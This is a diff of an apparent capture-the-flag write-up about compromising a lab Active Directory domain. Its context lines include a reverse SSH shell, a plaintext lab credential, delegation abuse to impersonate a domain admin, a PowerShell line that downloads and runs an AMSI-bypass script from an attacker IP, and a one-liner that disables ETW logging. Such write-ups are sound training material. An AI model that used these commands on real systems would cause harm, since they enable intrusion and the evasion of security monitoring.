@@ -1101,7 +1101,7 @@ ba5767768777e66866c46d799e19bd43
 ## Auth as c.neri_adm
 
 
-### Setup reverse SSH
+### Reverse SSH - Interactive shell
 
 > Run [reverse_ssh](https://github.com/NHAS/reverse_ssh) client with [logon type 9](https://learn.microsoft.com/windows-server/identity/securing-privileged-access/reference-tools-logon-types) via [RunasCs](https://github.com/antonioCoco/RunasCs) to gain full access to **WMI**
 {: .prompt-info }
@@ -1129,7 +1129,7 @@ Bypass-4MSI
 
 ![](/assets/obsidian/f57679fde34c11de38d60a474df3fdb4.png)
 
-> Manual bypass method was written in [[#Additional#Bypass AMSI & disable ETW manually]] section at the end of writeup
+> Manual bypass method was written in [Additional -> Bypass AMSI & disable ETW manually](#Additional#Bypass%20AMSI%20&%20disable%20ETW%20manually) section at the end of writeup
 {: .prompt-tip }
 
 Download and run **reverse_ssh** client
@@ -1301,7 +1301,7 @@ c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
 
 ### Delegations - Resource-Based Constrained Delegations (RBCD)
 
-We can abuse [**Resource-Based Constrained Delegations** (RBCD)](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) to impersonate domain administrator as a member of `DELEGATEDADMINS` group
+We can abuse [**Resource-Based Constrained Delegations** (RBCD)](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) to impersonate domain administrator on **DC01** as a member of `DELEGATEDADMINS` group
 
 ![](/assets/obsidian/9715ffc4b95ff716c02ef3a4a3b8ba5e.png)
 
@@ -1569,7 +1569,7 @@ Bypass **AMSI** at **dotnet** level via [Patching AmsiScanBuffer in clr.dll](htt
 PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/amsi_clr.txt')
 ```
 
-Disable **ETW** in current process to bypass **ETW**-based AV / EDR solutions that analyzes codes from **Script Block Logging**
+Disable **ETW** in current process to bypass **ETW**-based AV / EDR solutions that analyzes codes from events such as **Script Block Logging**
 
 ```bash
 PS C:\Windows\system32> [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
